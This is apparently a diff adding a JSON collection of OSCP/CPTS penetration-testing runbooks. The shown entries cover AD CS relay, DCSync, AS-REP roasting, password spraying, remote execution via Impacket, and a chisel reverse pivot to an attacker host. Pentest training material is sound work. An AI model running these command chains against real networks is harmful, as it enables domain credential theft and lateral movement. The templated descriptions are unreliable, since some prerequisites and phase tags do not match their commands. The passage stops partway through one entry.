@@ -1,0 +1,1052 @@
+[
+  {
+    "id": "0be26008-981f-5171-93ee-e398c31fd545",
+    "label": "AD CS Relay / ESC8 Flow",
+    "command": "certipy relay -ca <CA_NAME> -target http://<CA_HOST>/certsrv/\nntlmrelayx.py -debug -smb2support --target http://<CA_HOST>/certsrv/certfnsh.asp --adcs --template DomainController",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>AD CS Relay / ESC8 Flow</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#certipy</span> , <span style=\"color:#ef4444;font-weight:bold;\">#ntlmrelayx.py</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Relays NTLM auth to AD CS enrollment endpoints to request privileged certificates.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:373; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:274</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>certipy relay -ca &lt;CA_NAME&gt; -target http://&lt;CA_HOST&gt;/certsrv/\nntlmrelayx.py -debug -smb2support --target http://&lt;CA_HOST&gt;/certsrv/certfnsh.asp --adcs --template DomainController</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:ad",
+      "tool:certipy",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "0168ee3b-ccfd-507a-a1d6-f47fa5d43a70",
+    "label": "AD CS Vulnerable Template Discovery",
+    "command": "certipy find -u user@domain.local -p Passw0rd -vulnerable\ncertipy ca -u user@domain.local -p Passw0rd -dc-ip <ip>\ncertipy template -u user@domain.local -p Passw0rd -dc-ip <ip>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>AD CS Vulnerable Template Discovery</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#certipy</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Discovers exploitable AD CS templates and CA settings before abuse.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:307; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:337</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>certipy find -u user@domain.local -p Passw0rd -vulnerable\ncertipy ca -u user@domain.local -p Passw0rd -dc-ip &lt;ip&gt;\ncertipy template -u user@domain.local -p Passw0rd -dc-ip &lt;ip&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:ad",
+      "tool:certipy",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "42b25a88-b60c-5f1b-80bd-7eb22e1c2cd2",
+    "label": "AD Hash Cracking Workflow (NetNTLMv2 / TGS / AS-REP)",
+    "command": "hashcat -m 5600 responder_hashes.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 13100 tgs_hashes /usr/share/wordlists/rockyou.txt\nhashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>AD Hash Cracking Workflow (NetNTLMv2 / TGS / AS-REP)</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Standardized cracking pipeline for most AD hash artifacts encountered in OSCP/CPTS labs.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:24; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:165</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hashcat -m 5600 responder_hashes.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 13100 tgs_hashes /usr/share/wordlists/rockyou.txt\nhashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:ad",
+      "tool:hashcat",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "242d38ae-504b-5b48-9f75-ac2b68670e63",
+    "label": "AS-REP Roasting Workflow (Linux + Windows)",
+    "command": "impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile hashes.asreproast <DOMAIN>/<USER>\n./Rubeus.exe asreproast /nowrap\nhashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>AS-REP Roasting Workflow (Linux + Windows)</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#impacket</span> , <span style=\"color:#ef4444;font-weight:bold;\">#rubeus</span> , <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Harvests AS-REP material from preauth-disabled users and cracks offline.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:1680; docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:1691</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>impacket-GetNPUsers -dc-ip &lt;DC_IP&gt; -request -outputfile hashes.asreproast &lt;DOMAIN&gt;/&lt;USER&gt;\n.\\Rubeus.exe asreproast /nowrap\nhashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:linux",
+      "tool:impacket",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "3fe21630-fa2b-5bec-9b6e-a1fa755b3567",
+    "label": "ATExec Scheduled Task Command Execution",
+    "command": "atexec.py test.local/john:password123@10.10.10.1 <command>\natexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 <command>\nimpacket-atexec -k -no-pass <DOMAIN>/Administrator@<RHOST> 'type C:/PATH/TO/FILE/<FILE>'",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>ATExec Scheduled Task Command Execution</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#impacket</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Leverages task scheduler RPC to execute commands remotely on Windows hosts.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/saisathvik1-OSCP-Cheatsheet/README.md:576; docs/sources-runbooks/oscp-cpts/p0/saisathvik1-OSCP-Cheatsheet/README.md:577</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>atexec.py test.local/john:password123@10.10.10.1 &lt;command&gt;\natexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 &lt;command&gt;\nimpacket-atexec -k -no-pass &lt;DOMAIN&gt;/Administrator@&lt;RHOST&gt; &#x27;type C:\\\\PATH\\\\TO\\\\FILE\\\\&lt;FILE&gt;&#x27;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:offensive",
+      "tool:impacket",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "b5bb102d-7450-53a8-837c-51e17a168cec",
+    "label": "BloodHound Graph Collection from Linux",
+    "command": "bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -dc <DC_FQDN> -ns <DC_IP> -c all\nbloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP> -c All --zip",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>BloodHound Graph Collection from Linux</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#bloodhound</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Collects AD object relationships for graph-based attack path analysis.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:281; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:282</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>bloodhound-python -u &lt;USER&gt; -p &lt;PASS&gt; -d &lt;DOMAIN&gt; -dc &lt;DC_FQDN&gt; -ns &lt;DC_IP&gt; -c all\nbloodhound-python -u &lt;USER&gt; -p &lt;PASS&gt; -d &lt;DOMAIN&gt; -ns &lt;DC_IP&gt; -c All --zip</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:ad",
+      "tool:bloodhound",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "fc41eaf9-fcf1-57e4-b533-a212aa2428ac",
+    "label": "Chisel Reverse SOCKS Pivot",
+    "command": "chisel server -p 8001 --reverse\n./chisel.exe client <KALI_IP>:8001 R:1080:socks\n# update /etc/proxychains4.conf to use local 1080",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Chisel Reverse SOCKS Pivot</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#chisel</span> , <span style=\"color:#ef4444;font-weight:bold;\">#update</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Establishes reverse SOCKS pivoting from compromised host to attacker infrastructure.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:1529; docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:1534</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>chisel server -p 8001 --reverse\n.\\chisel.exe client &lt;KALI_IP&gt;:8001 R:1080:socks\n# update /etc/proxychains4.conf to use local 1080</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:pivoting",
+      "domain:offensive",
+      "tool:chisel",
+      "focus:pivoting"
+    ]
+  },
+  {
+    "id": "54eacf57-57fe-5f49-bfd0-25f0d89323fe",
+    "label": "DCOMExec Remote Command Channel",
+    "command": "impacket-dcomexec <RHOST> -object MMC20 -silentcommand -debug <DOMAIN>/<USERNAME>:<PASSWORD> <COMMAND>\nimpacket-dcomexec -dc-ip <RHOST> -object MMC20 -silentcommand <DOMAIN>/<USERNAME>@<RHOST> <COMMAND>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>DCOMExec Remote Command Channel</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#impacket</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Executes remote commands via DCOM where SMB/WMI may be filtered or monitored differently.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:5493; docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:5494</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>impacket-dcomexec &lt;RHOST&gt; -object MMC20 -silentcommand -debug &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; &lt;COMMAND&gt;\nimpacket-dcomexec -dc-ip &lt;RHOST&gt; -object MMC20 -silentcommand &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; &lt;COMMAND&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:lateral-movement",
+      "domain:offensive",
+      "tool:impacket",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "3126f1fa-54e5-58ec-b406-466085bb708f",
+    "label": "DCSync Credential Replication Attack",
+    "command": "./mimikatz.exe \"lsadump::dcsync /user:<DOMAIN>/administrator\" exit\nsecretsdump.py -just-dc-user <DOMAIN>/administrator <MACHINE_ACCOUNT>@<DC_IP> -hashes <LM>:<NT>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>DCSync Credential Replication Attack</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#mimikatz</span> , <span style=\"color:#ef4444;font-weight:bold;\">#secretsdump.py</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Replicates credential material directly from domain controller replication interfaces.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:752; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:281</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>.\\mimikatz.exe &quot;lsadump::dcsync /user:&lt;DOMAIN&gt;\\\\administrator&quot; exit\nsecretsdump.py -just-dc-user &lt;DOMAIN&gt;/administrator &lt;MACHINE_ACCOUNT&gt;@&lt;DC_IP&gt; -hashes &lt;LM&gt;:&lt;NT&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:ad",
+      "tool:mimikatz",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "f887f5f8-8321-5fea-a3e6-9be0b2746fd6",
+    "label": "DNS Zone Transfer and Record Enum",
+    "command": "dig axfr @<DNS_IP> <DOMAIN>\ndnsrecon -d <DOMAIN> -t axfr",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>DNS Zone Transfer and Record Enum</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#dig</span> , <span style=\"color:#ef4444;font-weight:bold;\">#dnsrecon</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Rapid DNS misconfiguration checks for subdomain and record expansion.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:296; docs/sources-runbooks/oscp-cpts/p0/lagarian-smith-oscp-cheat-sheet/OSCP_Notes.md:827</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>dig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt;\ndnsrecon -d &lt;DOMAIN&gt; -t axfr</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:network",
+      "tool:dig",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "d99d56e9-6b95-5f0b-addd-f91140a92577",
+    "label": "Domain Password Spray (SMB + Kerberos)",
+    "command": "kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> valid_users.txt <PASSWORD>\ncrackmapexec smb <DC_IP> -u valid_users.txt -p <PASSWORD> | grep +",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Domain Password Spray (SMB + Kerberos)</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#kerbrute</span> , <span style=\"color:#ef4444;font-weight:bold;\">#crackmapexec</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Controlled password spraying against enumerated user lists across Kerberos/SMB.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:53; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:54</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP/UDP 88</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>kerbrute passwordspray -d &lt;DOMAIN&gt; --dc &lt;DC_IP&gt; valid_users.txt &lt;PASSWORD&gt;\ncrackmapexec smb &lt;DC_IP&gt; -u valid_users.txt -p &lt;PASSWORD&gt; | grep +</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:ad",
+      "tool:kerbrute",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "388c2b73-ab46-521a-92be-aaf62e93b387",
+    "label": "Dynamic SOCKS Tunnel + Proxychains Chain",
+    "command": "ssh -D 1080 user@<PIVOT_IP>\nproxychains curl http://<INTERNAL_HOST>\nproxychains msfconsole",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Dynamic SOCKS Tunnel + Proxychains Chain</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#ssh</span> , <span style=\"color:#ef4444;font-weight:bold;\">#proxychains</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Fast dynamic tunnel setup for internal HTTP and framework traffic via one pivot hop.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/dollarboysushil-oscp-cpts-notes/pivoting-and-tunneling/dynamic-port-forwarding.md:23; docs/sources-runbooks/oscp-cpts/p0/dollarboysushil-oscp-cpts-notes/pivoting-and-tunneling/dynamic-port-forwarding.md:49</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>ssh -D 1080 user@&lt;PIVOT_IP&gt;\nproxychains curl http://&lt;INTERNAL_HOST&gt;\nproxychains msfconsole</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:pivoting",
+      "domain:web",
+      "tool:ssh",
+      "focus:pivoting"
+    ]
+  },
+  {
+    "id": "fc20e597-c477-5ce6-928a-cce65c08747f",
+    "label": "FFUF Directory and Endpoint Discovery",
+    "command": "ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://<HOST>/FUZZ -ic\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://<HOST>/indexFUZZ -ic",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>FFUF Directory and Endpoint Discovery</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#ffuf</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Enumerates hidden paths and extensions on web targets.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:320; docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:325</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  